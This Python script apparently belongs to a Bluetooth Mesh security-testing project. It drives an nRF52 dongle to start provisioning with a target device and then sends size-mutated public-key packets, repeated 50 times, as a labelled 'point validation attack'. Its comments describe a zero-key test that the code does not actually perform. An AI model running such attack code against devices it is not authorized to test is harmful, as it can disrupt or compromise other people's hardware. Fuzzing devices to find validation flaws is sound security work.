import sys
import os
import time
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__)))+"/../")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + "/libs/")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))) + "/libs/boofuzz/")

from colorama import Fore
from BLE_Mesh.Send_Packet.BluetoothMesh_SUL import BluetoothMesh_SUL

from BLE_Mesh.Config.ST import config

from BLE_Mesh.libs.driver.NRF52_dongle import NRF52Dongle
from scapy.utils import hexdump


port_name = config.device["port_name"]
logs_pcap = config.device["logs_pcap"]
pcap_filename = config.device["pcap_filename"]
key_path = config.device["key_path"]
unprovisioned_device_address = config.device["unprovisioned_device_address"]
iat = config.device["iat"]
rat = config.device["rat"]
role = config.device["role"]
rx_len = config.device["rx_len"]
tx_len = config.device["tx_len"]
logger_handle = config.device["log_path"]
algorithm = config.device["algorithm"]


def create_public_key_over_size(blemesh_sul):
   
    pkt = blemesh_sul.get_pkt("provisioning_public_key_pkt")

    # extract the original public key value (keep the original), if not found, fill with 64 bytes 0
    def extract_pk_from_pkt(p):
        pkx_val = None
        pky_val = None
        raw_bytes = b""
        targets = p if isinstance(p, list) else [p]
        for item in targets:
            if item.haslayer("Provisioning_Public_Key"):
                layer = item.getlayer("Provisioning_Public_Key")
                pkx_val = bytes(layer.PublicKeyX)
                pky_val = bytes(layer.PublicKeyY)
                break
            if item.haslayer("Raw"):
                raw_bytes += bytes(item.getlayer("Raw").load)
        if pkx_val is None:
            pkx_val = raw_bytes[:32] if len(raw_bytes) >= 32 else b"\x00" * 32
        if pky_val is None:
            if len(raw_bytes) >= 64:
                pky_val = raw_bytes[32:64]
            else:
                pky_val = b"\x00" * 32
        return pkx_val, pky_val


    pkx, pky = extract_pk_from_pkt(pkt)
    full_pk = pkx + pky  # keep the original value, not truncated or filled (if less than 64 bytes, fill with 0)

    print(len(full_pk))
    print(Fore.CYAN + f"full_pk: {full_pk.hex()}")
    if len(full_pk) < 64:
        full_pk = full_pk + b"\x00" * (64 - len(full_pk))

    # for each segment, randomly increase or decrease the payload length, construct oversize/undersize fragments, but the core data order remains unchanged
    def mutate_segment(data: bytes, base_len: int) -> bytes:
        # randomly increase or decrease the length in the range of [-2, +4]
        delta = random.randint(-2, 4)
        if delta < 0:
            return data[: max(0, base_len + delta)]
        if delta > 0:
            return data[:base_len] + os.urandom(delta)
        return data[:base_len]

    if isinstance(pkt, list):
        offset = 0
        for p in pkt:
            if p.haslayer("Provisioning_Public_Key"):
                pubkey = p.getlayer("Provisioning_Public_Key")
                pubkey.PublicKeyX = pkx
                pubkey.PublicKeyY = pky
            elif p.haslayer("Raw"):

                # print("-------------------------------------------------")
                # print(Fore.CYAN + p.getlayer("Raw").load.hex())
                # print("-------------------------------------------------")
                raw = p.getlayer("Raw")
                seg_len = len(raw.load)
                slice_data = full_pk[offset:offset + seg_len]
                raw.load = mutate_segment(slice_data, seg_len)
                print("-------------------------------------------------")
                print(Fore.CYAN + p.getlayer("Raw").load.hex())
                print("-------------------------------------------------")
                offset += seg_len
    else:
        if pkt.haslayer("Provisioning_Public_Key"):
            pubkey = pkt.getlayer("Provisioning_Public_Key")
            pubkey.PublicKeyX = pkx
            pubkey.PublicKeyY = pky
        elif pkt.haslayer("Raw"):
            raw = pkt.getlayer("Raw")
            seg_len = len(raw.load)
            slice_data = full_pk[:seg_len]
            raw.load = mutate_segment(slice_data, seg_len)


    return pkt


def pubkey_point_validation_attack(blemesh_sul):

    print(Fore.YELLOW + "=" * 80)
    print(Fore.YELLOW + "[Attack Test] PUBKEY-POINT-VALIDATION-01: Public Key Point Validation Attack")
    print(Fore.YELLOW + "=" * 80)

    
    # ========== Test Case: Send Invalid ECDH Public Key Point ==========
    print(Fore.RED + "[Test Case] Send Invalid ECDH Public Key Point (Public Key Point Validation Test)")
    print(Fore.RED + "Target: Test if the device validates the P-256 point legally (whether on the curve, whether it is an infinite point, boundary values, etc.)")

    
    # Step 1: Establish a normal provisioning process to the Public Key stage
    print(Fore.CYAN + "Step 1: Establish a normal provisioning process to the Public Key stage...")
    link_open_pkt = blemesh_sul.get_pkt("link_open_message_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=link_open_pkt)
    print(Fore.GREEN + "  ✓ Link Open Sent")

    
    invite_pkt = blemesh_sul.get_pkt("provisioning_invite_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=invite_pkt)
    print(Fore.GREEN + "  ✓ Invite 已发送")

    
    pkt = blemesh_sul.get_pkt("transaction_acknowledgment_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)

    

    
    start_pkt = blemesh_sul.get_pkt("provisioning_start_pkt")
    receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=start_pkt)
    print(Fore.GREEN + "  ✓ Start Sent")
    
    if receive_pkt and receive_pkt != "empty":
        print(Fore.CYAN + f"    -> Response Received: {receive_pkt}")
    print()
    
    time.sleep(1)
    
    # Step 2: Attack - Send Zero Public Key (Invalid Point)
    print(Fore.RED + "Step 2: Attack - Send Zero Public Key (Invalid Point)")
    print(Fore.RED + "  ⚠ This is an attack step: the zero public key is not on the curve, it should be rejected")
    print()
    
    over_size_key = create_public_key_over_size(
        blemesh_sul
    )
    
    print(Fore.CYAN + "  Send Oversize Public Key (PublicKeyX=0x00..., PublicKeyY=0x00...)...", end=" ... ")
    
    try:
        receive_pkt = blemesh_sul.packet_send_received_control(
            send_pkt=over_size_key,
            send_attempts=10,
            receive_attempts=50
        )
        
        if receive_pkt and receive_pkt != "empty":
            print(Fore.YELLOW + "⚠ Response Received")
            print(Fore.YELLOW + f"    -> Response: {receive_pkt}")
            print(Fore.RED + "    ⚠ Warning: the device accepted the oversize public key! the oversize or invalid public key was accepted")
        else:
            print(Fore.GREEN + "✓ No Response (the device may have correctly rejected the invalid public key)")
    except Exception as e:
        print(Fore.RED + f"✗ Exception: {str(e)}")
        print(Fore.YELLOW + "    ⚠ May trigger password library exception path")
    
    print()
 
   


# 主程序
for i in range(50):
    print(Fore.YELLOW + f"Test {i+1}...")
    blemesh_sul = BluetoothMesh_SUL(NRF52Dongle(port_name=port_name, logs_pcap=logs_pcap, pcap_filename=pcap_filename),
                                    unprovisioned_device_address,
                                    iat=iat,
                                    rat=rat,
                                    role=role,
                                    rx_len=rx_len,
                                    tx_len=tx_len,
                                    logger_handle=logger_handle,
                                    key_path=key_path,
                                    algorithm=algorithm)

    device_state = blemesh_sul.pre()

    print(device_state)

    if device_state == "unprovisioned_device_beacon_pkt":
        print(Fore.GREEN + "Device found, starting point validation attack")
        receive_pkt = ""
        while "Link_ACK_Message" not in receive_pkt:        
            pkt = blemesh_sul.get_pkt("link_open_message_pkt")
            receive_pkt = blemesh_sul.packet_send_received_control(send_pkt=pkt)
            print(receive_pkt)
        print(Fore.GREEN + "Link_ACK_Message received")
        pubkey_point_validation_attack(blemesh_sul)
    elif device_state == "secure_network_beacon_pkt":
        print(Fore.GREEN + "Device found, already in secure network")
        print(Fore.YELLOW + "Point validation attack requires unprovisioned device")
    else:
        print(Fore.YELLOW + "Device state unknown, attempting attack anyway...")
        pubkey_point_validation_attack(blemesh_sul)

    # blemesh_sul.post()


